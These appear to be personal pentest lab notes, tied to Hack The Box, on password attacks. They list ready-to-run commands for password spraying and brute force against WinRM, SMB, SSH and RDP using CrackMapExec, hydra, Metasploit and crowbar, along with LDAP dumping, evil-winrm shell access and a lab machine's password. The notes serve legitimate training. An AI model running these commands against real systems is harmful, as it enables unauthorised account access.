#auth 

https://academy.hackthebox.com/storage/resources/Password-Attacks.zip

##### [[la1n-notes/services/SMB/SMB|SMB]], [[LDAP]], [[mssql]], etc.
https://github.com/byt3bl33d3r/CrackMapExec
#CrackMapExec 
```shell
sudo apt-get -y install crackmapexec

# Dictionary-attack / Password-Spraying
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

```shell
crackmapexec --verbose smb 10.129.42.197 -u "user" -p "password" --shares
```
#### [[la1n-notes/services/SMB/SMB|SMB]] enumeration
list shares
```bash
netexec smb 10.129.128.107  -u michael.wrightson -p Cicada$M6Corpb*@Lp#nZpsmbmap -H 10.129.128.107 --shares
```
#### #ldap 
Dump everything (domains/users/etc)
```bash
ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.129.128.107 -o dump
```

#### #evil-winrm 
#shell [[bind shell]]
to log in and get the shell:
```bash
sudo gem install evil-winrm
evil-winrm -i 10.129.42.197 -u user -p password
```

[[hydra]]
```shell-session
hydra -L user.list -P password.list ssh://10.129.42.197
```

```shell-session
 hydra -L user.list -P password.list rdp://10.129.42.197
```

```shell-session
 hydra -L user.list -P password.list smb://10.129.42.197
```

```bash
hydra -L user.list -P password.list 10.129.42.197 smb
```

```bash
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
### Dictionary attack on [[SMB]] use [[metasploit]]
```shell
msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE password.list

set SMB_USER jason
set USER_FILE username.list

set stop_on_success true
set RHOST STMIP
run
```

### [[RDP]] Password Spraying
https://github.com/galkan/crowbar
Installation:
```bash
sudo apt install -y crowbar
# or
git clone https://github.com/galkan/crowbar
cd crowbar/
pip3 install -r requirements.txt
```

```bash
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

